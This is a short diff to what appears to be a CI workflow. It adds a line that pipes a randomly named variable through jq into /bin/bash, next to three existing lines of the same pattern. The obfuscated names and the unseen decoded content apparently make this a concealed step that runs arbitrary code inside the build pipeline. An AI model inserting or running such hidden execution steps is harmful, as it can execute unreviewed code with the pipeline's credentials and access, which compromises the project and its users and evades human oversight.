@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$egdds8079" | jq -r .ebg2212 | /bin/bash
           printf '%s' "$xkd37" | jq -r .wc0 | /bin/bash
           printf '%s' "$flec4707" | jq -r .fsr7391 | /bin/bash
+          echo $wvorc2 | jq -r .y67 | /bin/bash
 
       - name: Persist results
         if: always()
